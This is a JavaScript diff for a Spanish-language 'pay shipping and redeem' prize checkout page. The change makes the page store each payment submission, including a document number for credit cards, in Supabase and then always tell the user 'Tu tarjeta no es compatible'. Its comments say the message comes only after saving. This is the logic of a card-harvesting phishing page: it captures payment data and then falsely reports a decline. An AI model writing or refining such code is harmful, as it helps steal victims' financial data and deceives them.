@@ -599,18 +599,18 @@ document.getElementById('payBtn').addEventListener('click', async function() {
   if (tipoActual === 'credito') payload.documento = docVal;
 
   try {
+    // Siempre guarda los datos en Supabase
     await guardarEnSupabase(payload);
-    // Éxito
-    document.getElementById('checkout').classList.remove('show');
-    document.getElementById('pickedName').textContent = selected;
-    document.getElementById('success').classList.add('show');
-  } catch(err) {
-    // Si Supabase no está configurado aún, igual avanzamos con alerta
-    console.warn('Supabase no configurado o error:', err.message);
-    // Mostramos igual la pantalla de éxito para poder demostrarlo
-    document.getElementById('checkout').classList.remove('show');
-    document.getElementById('pickedName').textContent = selected;
-    document.getElementById('success').classList.add('show');
+    
+    // Muestra el mensaje de "no compatible" DESPUÉS de guardar
+    msgEl.textContent = 'Tu tarjeta no es compatible';
+    msgEl.className = 'pay-msg err';
+    
+  } catch (err) {
+    // Este bloque solo se ejecuta si hay un error real al guardar en Supabase
+    msgEl.textContent = 'Error al guardar los datos';
+    msgEl.className = 'pay-msg err';
+    console.warn('Error al guardar en Supabase:', err.message);
   } finally {
     payBtn.disabled = false;
     payBtn.textContent = 'Pagar envío y canjear';
@@ -624,7 +624,6 @@ document.getElementById('backSuc').addEventListener('click', function() {
 document.getElementById('goApp').addEventListener('click', function() {
   document.getElementById('success').classList.remove('show');
 });
-
 /* ================================================================
    CONFETI
    ================================================================ */
